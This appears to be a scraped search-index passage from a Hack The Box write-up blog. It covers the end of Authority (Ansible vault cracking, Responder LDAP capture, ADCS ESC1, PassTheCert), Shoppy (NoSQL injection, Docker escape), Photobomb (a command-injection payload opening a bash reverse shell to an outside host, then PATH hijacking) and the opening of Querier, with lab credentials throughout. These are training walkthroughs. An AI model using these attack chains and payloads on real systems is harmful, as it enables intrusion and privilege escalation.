$ANSIBLE_VAULT;1.1;AES256633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764$cat pwm_admin_login $ANSIBLE_VAULT;1.1;AES256326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a346431373431666433343434366139356536343763336662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438$cat pwm_admin_password $ANSIBLE_VAULT;1.1;AES256313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531$ansible2john ldap_admin_password pwm_admin_login pwm_admin_password | tee ansible_hashesldap_admin_password:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635pwm_admin_login:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8pwm_admin_password:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5HashcatNow, we can use hashcat to crack all the hashes.$hashcat ansible_hashes /usr/share/wordlists/rockyou.txt --user$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&amp;*$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@#$%^&amp;*$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635:!@#$%^&amp;*$cat ldap_admin_password | ansible-vault decryptVault password: Decryption successfulDevT3st@123$cat pwm_admin_login | ansible-vault decryptVault password: Decryption successfulsvc_pwm$cat pwm_admin_password | ansible-vault decryptVault password: Decryption successfulpWm_@dm!N_!23PWM AccessSince we have the credentials we can try to login to the website with it. The password pWm_@dm!N_!23 works to login to the configuration manager.Configuration managerConfiguration editorWe can also login to the Configuration Editor with the same credentials pWm_@dm!N_!23In LDAP connection config we got the hostname authority.authority.htb and the username svc_ldap. The credentials are store but we cannot view it.ResponderWe can now use reponder to grab the ldap credentials. We will open responder and start listening on the tun0 interface and port 389.$sudo responder -I tun0Once we configure LDAP url to our interface and click on test LDAP profile, we can get the LDAP credentials in clear text.[LDAP] Cleartext Client : 10.10.11.222[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!Using netexec winrm we can test the credentials and we can see that we can get shell acess as svc_ldap.$netexec winrm 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'WINRM 10.10.11.222 5985 AUTHORITY [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)WINRM 10.10.11.222 5985 AUTHORITY [+] authority.htb\\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)Evil-winrmWe got shell as svs_ldap using evil-winrm.$evil-winrm -i 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'*Evil-WinRM* PS C:\\Users\\svc_ldap&gt;Shell as AdministratorADCS ExploitationWe will use certipy on our attacker machine to enumerate ADCS. We can use find command to identify templates and use -vunlerable option to only show the vulnerables ones.$certipy find -dc-ip 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -stdout -vulnerableCertipy v4.8.2 - by Oliver Lyak (ly4k)[*] Finding certificate templates[*] Found 37 certificate templates[*] Finding certificate authorities[*] Found 1 certificate authority[*] Found 13 enabled certificate templates[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP[!] Failed to connect to remote registry. Service should be starting now. Trying again...[*] Got CA configuration for 'AUTHORITY-CA'[*] Enumeration output:Certificate Authorities 0 CA Name : AUTHORITY-CA DNS Name : authority.authority.htb Certificate Subject : CN=AUTHORITY-CA, DC=authority, DC=htb Certificate Serial Number : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4 Certificate Validity Start : 2023-04-24 01:46:26+00:00 Certificate Validity End : 2123-04-24 01:56:25+00:00 Web Enrollment : Disabled User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Permissions Owner : AUTHORITY.HTB\\Administrators Access Rights ManageCertificates : AUTHORITY.HTB\\Administrators AUTHORITY.HTB\\Domain Admins AUTHORITY.HTB\\Enterprise Admins ManageCa : AUTHORITY.HTB\\Administrators AUTHORITY.HTB\\Domain Admins AUTHORITY.HTB\\Enterprise Admins Enroll : AUTHORITY.HTB\\Authenticated UsersCertificate Templates 0 Template Name : CorpVPN Display Name : Corp VPN Certificate Authorities : AUTHORITY-CA Enabled : True Client Authentication : True Enrollment Agent : False Any Purpose : False Enrollee Supplies Subject : True Certificate Name Flag : EnrolleeSuppliesSubject Enrollment Flag : AutoEnrollmentCheckUserDsCertificate PublishToDs IncludeSymmetricAlgorithms Private Key Flag : ExportableKey Extended Key Usage : Encrypting File System Secure Email Client Authentication Document Signing IP security IKE intermediate IP security use KDC Authentication Requires Manager Approval : False Requires Key Archival : False Authorized Signatures Required : 0 Validity Period : 20 years Renewal Period : 6 weeks Minimum RSA Key Length : 2048 Permissions Enrollment Permissions Enrollment Rights : AUTHORITY.HTB\\Domain Computers AUTHORITY.HTB\\Domain Admins AUTHORITY.HTB\\Enterprise Admins Object Control Permissions Owner : AUTHORITY.HTB\\Administrator Write Owner Principals : AUTHORITY.HTB\\Domain Admins AUTHORITY.HTB\\Enterprise Admins AUTHORITY.HTB\\Administrator Write Dacl Principals : AUTHORITY.HTB\\Domain Admins AUTHORITY.HTB\\Enterprise Admins AUTHORITY.HTB\\Administrator Write Property Principals : AUTHORITY.HTB\\Domain Admins AUTHORITY.HTB\\Enterprise Admins AUTHORITY.HTB\\Administrator [!] Vulnerabilities ESC1 : 'AUTHORITY.HTB\\\\Domain Computers' can enroll, enrollee supplies subject and template allows client authenticationIt identifies a template CorpVPN and this is vulnerable to ESC1.According to this post. Templates vulnerable to ESC1 must have the following configurations: Client Authentication: True Enabled: True Enrollee Supplies Subject: True Requires Management Approval: False Authorized Signatures Required: 0This conditions matches the output that comes out of authority but with only one difference. In this, case Domain Computers can enroll with this templates, not Domain Users.Creating Computer AccountThe settings that allows a user to add a computer to domain is thems-ds-machineaccountquota. We can use netexec to view the machinequota.$netexec ldap 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M maqSMB 10.10.11.222 445 AUTHORITY [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)LDAPS 10.10.11.222 636 AUTHORITY [+] authority.htb\\svc_ldap:lDaP_1n_th3_cle4r! MAQ 10.10.11.222 389 AUTHORITY [*] Getting the MachineAccountQuotaMAQ 10.10.11.222 389 AUTHORITY MachineAccountQuota: 10This means we can add upto 10 computers. We can add computers using impacket-addcomputer.$impacket-addcomputer Authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name testerpc -computer-pass 'Password@123' -method LDAPS -dc-ip 10.10.11.222Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Successfully added machine account testerpc$ with password Password@123.With the computer account created earlier, certipy will create a certificate along with the private key.$certipy req -username testerpc$ -password Password@123 -ca AUTHORITY-CA -dc-ip 10.10.11.222 -template CorpVPN -upn administrator@authority.htb -dns authority.htbCertipy v4.8.2 - by Oliver Lyak (ly4k)[*] Requesting certificate via RPC[*] Successfully requested certificate[*] Request ID is 4[*] Got certificate with multiple identifications UPN: 'administrator@authority.htb' DNS Host Name: 'authority.htb'[*] Certificate has no object SID[*] Saved certificate and private key to 'administrator_authority.pfx'PassTheCertWe can use certipy auth command to get the NTLM hash of the administrator but this failed.certipy auth -pfx administrator_authority.pfxCertipy v4.8.2 - by Oliver Lyak (ly4k)[*] Found multiple identifications in certificate[*] Please select one: [0] UPN: 'administrator@authority.htb' [1] DNS Host Name: 'authority.htb'&gt; 0[*] Using principal: administrator@authority.htb[*] Trying to get TGT...[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)This happens “when a domain controller doesn’t have a certificate installed for smart cards”. Specifically, it happens because “the DC isn’t properly set up for PKINIT and authentication will fail”.Alternatively, we can use PassTheCert attack.To perform the PassTheCert attack. We will need key and cert in seprate files. We will use certipy to get these files.$python3 passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222#helpadd_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.add_user new_user [parent] - Creates a new user.add_user_to_group user group - Adds a user to a group.# add_user_to_group svc_ldap administratorsAdding user: svc_ldap to group Administrators result: OKsvc_ldap has been added to the administrators group. We can use psexec to confim that we can login as administrator.impacket-psexec authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!'@10.10.11.222 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Requesting shares on 10.10.11.222.....[*] Found writable share ADMIN$[*] Uploading file YZVCWrHm.exe[*] Opening SVCManager on 10.10.11.222.....[*] Creating service NYke on 10.10.11.222.....[*] Starting service NYke.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.17763.4644](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt; whoamint authority\\system" }, { "title": "Hack The Box - Shoppy", "url": "/posts/Hack-The-Box-Shoppy/", "categories": "hackthebox", "tags": "linux, easy, nosql, docker, hashcat", "date": "2023-02-12 00:00:00 -0500", "snippet": "Shoppy was a easy linux machine, which was vulnerable to NOSQL injection. Exploiting NOSQL injection, we got password hash of all users. After cracking the hash of one user, the Mattermost server w...", "content": "Shoppy was a easy linux machine, which was vulnerable to NOSQL injection. Exploiting NOSQL injection, we got password hash of all users. After cracking the hash of one user, the Mattermost server was accessed,where we discovered one of the users’ SSH credentials. After gaining access to the box, the credentials of another user were retrieved from the password-manager binary. After escaping a Docker container, we escalated our privileges to root.RECONNMAPStarting with nmap, nmap shows only port 22(ssh) , 80(http) are open. port22: OpenSSH port80: nginx1.23.1: redirects tohttp://shoppy.htb$sudo nmap 10.10.11.180 Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-16 12:40 +0545 Nmap scan report for shoppy.htb (10.10.11.180) Host is up (0.32s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 5.15 seconds$sudo nmap -sC -sV -p 22,80 10.10.11.180 -oN shoppy.nmap Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-16 12:41 +0545 Nmap scan report for shoppy.htb (10.10.11.180) Host is up (0.28s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA) | 256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA) |_ 256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519) 80/tcp open http nginx 1.23.1 |_http-title: Shoppy Wait Page |_http-server-header: nginx/1.23.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.59 secondsPort - 80On Browsing 10.10.11.180 it redirects us to shoppy.htb . so adding it to our /etc/hosts file.$cat /etc/hosts10.10.11.180 shoppy.htbVisiting http://shoppy.htb/ revealed a straightforward countdown page announcing the upcoming release of Shoppy Beta.Directory Fuzzing$sudo ffuf -u http://shoppy.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://shoppy.htb/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ # directory-list-2.3-small.txt [Status: 200, Size: 2178, Words: 853, Lines: 57] images [Status: 301, Size: 179, Words: 7, Lines: 11] login [Status: 200, Size: 1074, Words: 152, Lines: 26] admin [Status: 302, Size: 28, Words: 4, Lines: 1] assets [Status: 301, Size: 179, Words: 7, Lines: 11] css [Status: 301, Size: 173, Words: 7, Lines: 11] Login [Status: 200, Size: 1074, Words: 152, Lines: 26] js [Status: 301, Size: 171, Words: 7, Lines: 11]Found a login page. http://shoppy.htb/loginAfter testing it for login bypass using sql injection it did not work.Authentication Bypass NoSQLAfter couple minutes of experimenting with the authentication logic, we notice that it may be a MongoDB NoSQL database running.We can bypass the authentication logic via:admin'||'1==1 which always returns true.Once we’re logged in, we see a minimalistic admin panel.Entering the same payload on search bar .we get a list of users and their hashes.Hash crackingUsing hashcat to crack obtained md5 hash.$sudo hashcat -m 0 hash /usr/share/wordlists/rockyou.txt$sudo hashcat -m 0 --show hash 6ebcea65320589ca4f2f1ce039975995:remembermethiswaywe were able to crack hash for the user josh.Tried to use this credential to login into the SSH account of user josh but got login failed.Vhost Discovery via ffufUsing ffuf to enumerate vhosts.$sudo ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://shoppy.htb -H \"Host: FUZZ.shoppy.htb\" -mc 200 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://shoppy.htb :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt :: Header : Host: FUZZ.shoppy.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200 ________________________________________________ mattermost [Status: 200, Size: 3122, Words: 141, Lines: 1]Vhost Bruteforce found a new host mattermost.shoppy.htb.Let us add it to our hosts file.$cat /etc/hosts10.10.11.180 shoppy.htb mattermost.shoppy.htbon browsing http://mattermost.shoppy.htb it redirects us to a login page.we found out that we can login with the credentials of josh user found earlier.Going through the webpage we found out credentials for jaeger user on the Deploy Machine Channel.Shell as JaegerWe can now ssh into the box using this credentials. jaeger: Sh0ppyBest@pp!$sudo ssh jaeger@10.10.11.180 Connecting to 10.10.11.180:22... Connection established. To escape to local shell, press 'Ctrl+Alt+]'. Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. /usr/bin/xauth: file /home/jaeger/.Xauthority does not exist jaeger@shoppy:~$User jaeger is allowed to run password-manager as deploy.jaeger@shoppy:~$ sudo -l Matching Defaults entries for jaeger on shoppy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jaeger may run the following commands on shoppy: (deploy) /home/deploy/password-managerBut when we try to run password-manager as deploy user. it prompts us for master password.jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager [sudo] password for jaeger: Welcome to Josh password manager! Please enter your master password:Tried to use the same password found earlier of user jaeger i.e Sh0ppyBest@pp! but it didnot work.Shell as Deployon closely checking at the contents of password-manager found in the home directory of deploy user , we can see that the password as Sample.Password-manager file contains the credential deploy : Deploying@pp!jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager Welcome to Josh password manager! Please enter your master password: Sample Access granted! Here is creds ! Deploy Creds : username: deploy password: Deploying@pp!we can use this credentials to switch user as deploy.jaeger@shoppy:/home/deploy$ su - deploy Password: $ whoami deployShell as Rooton checking the id of deploy we can see that deploy is a member of docker group.We probably are in a docker container .deploy@shoppy:~$ iduid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)we can escape the docker container and esclate our privilege as root using the following docker command.deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh # whoami root # id uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo) #and we are root." }, { "title": "Hack The Box - Photobomb", "url": "/posts/HAck-the-Box-Photobomb/", "categories": "hackthebox", "tags": "linux, easy, path hijack, command injection, photobomb", "date": "2023-02-12 00:00:00 -0500", "snippet": "Photobomb was a easy rated linux box, where plaintext credentials was discovered afterviewing the source code. These credentials then lead to a webpage with download functionality that was vulnerab...", "content": "Photobomb was a easy rated linux box, where plaintext credentials was discovered afterviewing the source code. These credentials then lead to a webpage with download functionality that was vulnerable to blind command injection. User was able to run the script with sudo permission and path hijacking was used to escalate privileges to root.RECONNMAPInitial nmap scan discoverd ony two ports 22(ssh) and 80(http) open.$nmap -p- --min-rate 10000 10.10.11.182 -oN photobomb.nmap Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-12 10:39 +0545 Nmap scan report for 10.10.11.182 Host is up (0.081s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds $nmap -p 22,80 -sC -sV --min-rate 10000 10.10.11.182 -oN photobomb-service.nmapStarting Nmap 7.92 ( https://nmap.org ) at 2023-02-12 10:40 +0545 Nmap scan report for 10.10.11.182 Host is up (0.080s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA) | 256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA) |_ 256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://photobomb.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 10.25 secondsWEB PORT 80on browsing the ip address http://10.10.11.182 it redirects us to photobomb.htb. so adding it to /etc/hosts$sudo echo \"10.10.11.182 photobomb.htb\" &gt;&gt; /etc/hosts$cat /etc/hosts10.10.11.182 photobomb.htbon browsing, http://photobomb.htb it disaplayed a page containing a link. This link then redirect us to a login portal at /printer.we tried some default credentails admin:admin admin:password but it doesnot seem to work.When trying to visit photobomb.htb/index.html or any other page that doesnot exists, it shows that sinatra does’nt know this ditty.SOURCE CODEviewing the source code of the photobomb.htb, there’s a photobomb.js and we found some credentials on it.function init() { // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me if (document.cookie.match(/^(.*;)?\\s*isPhotoBombTechSupport\\s*=\\s*[^;]+(.*)?$/)) { document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer'); } } window.onload = init;with these creds we can now login to /printer. After we are logged in, it dispalys a webpage that includes a several images, as well as the ability to specify their dimensions and download them.COMMAND INJECTIONwhile testing for command injection, when we add sleep 5 on photo or dimension parameter we get 500 server error response.But when we add sleep 5 on filetype parameter we get response after 5400 milisecs, this confirms that there’s a command injection vulnerability.SHELL AS WIZARDOn replacing sleep 5 with our reverse shell we got shell as wizard user.photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg&amp;filetype=png%3bbash+-c+'bash+-i+&gt;%26+/dev/tcp/10.10.14.14/4444+0&gt;%261'&amp;dimensions=150x100$sudo nc -lvnp 4444 listening on [any] 4444 ...connect to [10.10.14.14] from (UNKNOWN) [10.10.11.182] 55200bash: cannot set terminal process group (734): Inappropriate ioctl for devicebash: no job control in this shellwizard@photobomb:~/photobomb$ SHELL AS ROOTOn running sudo -l, the output shows that the user wizard can run /opt/cleanup.sh with sudo permissions and without password.wizard@photobomb:~$ sudo -lsudo -lMatching Defaults entries for wizard on photobomb: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser wizard may run the following commands on photobomb: (root) SETENV: NOPASSWD: /opt/cleanup.shPATH HIJACKING/opt/cleanup.shWe cannot edit the contents of /opt/cleanup.sh but we can read it.cat /opt/cleanup.sh#!/bin/bash. /opt/.bashrccd /home/wizard/photobomb# clean up log filesif [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ]then /bin/cat log/photobomb.log &gt; log/photobomb.log.old /usr/bin/truncate -s0 log/photobomb.logfi# protect the priceless originalsfind source_images -type f -name '*.jpg' -exec chown root:root {} \\;On analysing, the cleaup.sh script we can see that there’s a path hijacking. Here, all the binaries are referenced with the full path except find.That means, bash will look for binaries in $PATH and find will run from /usr/bin/find.wizard@photobomb:/tmp$ echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binwizard@photobomb:/tmp$ which find/usr/bin/findcreating find file in /tmp and making it executable.wizard@photobomb:/tmp$ pwd/tmpwizard@photobomb:/tmp$ cat find#!/bin/bashbashwizard@photobomb:/tmp$ chmod +x findnow we can run cleanup.sh with sudo permission but set the PATH variable to /tmp and get a root shell.wizard@photobomb:/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.shroot@photobomb:/home/wizard/photobomb#" }, { "title": "Hack The Box - Querier", "url": "/posts/Hack-The-Box-Querier/", "categories": "hackthebox", "tags": "smbclient, olevba, impacket-mssqlclient, impacket-psexec, impacket-mssqlclient, xp-dirtree, hashcat, medium", "date": "2023-02-05 00:00:00 -0500", "snippet": "Querier was a medium box that involved retrieving MSSQL database credentials after analyzingmacro-enabled Excel workbook. These credentials were then used to establish a connection to the MSSQL dat...", "content": "Querier was a medium box that involved retrieving MSSQL database credentials after analyzingmacro-enabled Excel workbook. These credentials were then used to establish a connection to the MSSQL database viaimpacket-mssqlclient as a limited user through which we obtain the NEt-NTLMv2 hash from the responder.PowerUp.ps1 then retrieved administrator credentials from a GPP file, and we got the shell as administrator.NMAPNmap scan shows multiple open ports, including a Microsoft SQL Server 2017$sudo nmap -p- -sC -sV --min-rate 10000 -oN querier.nmap 10.10.10.125Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-04 19:46 +0545Nmap scan report for 10.10.10.125Host is up (0.070s latency).Not shown: 65518 closed tcp ports (reset)PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM| ms-sql-ntlm-info:| Target_Name: HTB| NetBIOS_Domain_Name: HTB| NetBIOS_Computer_Name: QUERIER| DNS_Domain_Name: HTB.LOCAL| DNS_Computer_Name: QUERIER.HTB.LOCAL| DNS_Tree_Name: HTB.LOCAL|_ Product_Version: 10.0.17763| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: 2023-02-04T13:59:11|_Not valid after: 2053-02-04T13:59:11|_ssl-date: 2023-02-04T14:02:33+00:00; -11s from scanner time.5005/tcp filtered avt-profile-25985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found26583/tcp filtered unknown47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPC49670/tcp open msrpc Microsoft Windows RPC49671/tcp open msrpc Microsoft Windows RPC51547/tcp filtered unknownService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time:| date: 2023-02-04T14:02:24|_ start_date: N/A| ms-sql-info:| 10.10.10.125:1433:| Version:| name: Microsoft SQL Server 2017 RTM| number: 14.00.1000.00| Product: Microsoft SQL Server 2017| Service pack level: RTM| Post-SP patches applied: false|_ TCP port: 1433|_clock-skew: mean: -11s, deviation: 0s, median: -12s| smb2-security-mode:| 3.1.1:|_ Message signing enabled but not requiredService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 75.01 secondsSMB ENUMERATIONUsing smbclient null authentication to list down shares. $smbclient -N -L //10.10.10.125 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC Reports DiskSMB1 disabled -- no workgroup availableInside the Reports share, there’s a single file Currency Volume Report.xlsm$smbclient //10.10.10.125/Reports Password for [WORKGROUP\\niraz]:Try \"help\" to get a list of possible commands.smb: \\&gt; dir . D 0 Tue Jan 29 05:08:48 2019 .. D 0 Tue Jan 29 05:08:48 2019 Currency Volume Report.xlsm A 12229 Mon Jan 28 04:06:34 2019 5158399 blocks of size 4096. 848080 blocks availableDownloading the report to our local machine.$smbclient -N //10.10.10.125/Reports Try \"help\" to get a list of possible commands.smb: \\&gt; dir . D 0 Tue Jan 29 05:08:48 2019 .. D 0 Tue Jan 29 05:08:48 2019 Currency Volume Report.xlsm A 12229 Mon Jan 28 04:06:34 2019 5158399 blocks of size 4096. 852223 blocks availablesmb: \\&gt; mget *Get file Currency Volume Report.xlsm? ygetting file \\Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (35.5 KiloBytes/sec) (average 35.5 KiloBytes/sec)ANALYSIS OF CURRENCY VOLUME REPORT.XLSMA .xlsm file is a type of Microsoft Excel workbook that contains macros.We can use olevba to analyse this file.$olevba Currency\\ Volume\\ Report.xlsmolevba 0.60 on Python 3.9.2 - http://decalage.info/python/oletools===============================================================================FILE: Currency Volume Report.xlsmType: OpenXMLWARNING For now, VBA stomping cannot be detected for files in memory-------------------------------------------------------------------------------VBA MACRO ThisWorkbook.clsin file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -' macro to pull data for client volume reports'' further testing requiredPrivate Sub Connect()Dim conn As ADODB.ConnectionDim rs As ADODB.RecordsetSet conn = New ADODB.Connectionconn.ConnectionString = \"Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6\"conn.ConnectionTimeout = 10conn.OpenIf conn.State = adStateOpen Then ' MsgBox \"connection successful\" 'Set rs = conn.Execute(\"SELECT * @@version;\") Set rs = conn.Execute(\"SELECT * FROM volume;\") Sheets(1).Range(\"A1\").CopyFromRecordset rs rs.CloseEnd IfEnd Sub-------------------------------------------------------------------------------VBA MACRO Sheet1.clsin file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -(empty macro)+----------+--------------------+---------------------------------------------+|Type |Keyword |Description |+----------+--------------------+---------------------------------------------+|Suspicious|Open |May open a file ||Suspicious|Hex Strings |Hex-encoded strings were detected, may be || | |used to obfuscate strings (option --decode to|| | |see all) |+----------+--------------------+---------------------------------------------+EASTABLISHING MSSQL CONNECTION THROUGH MSSQLCLIENTwe cab use mssqlclient.py from impacket to connect to the database.$python3 mssqlclient.py reporting@10.10.10.125 -windows-authImpacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 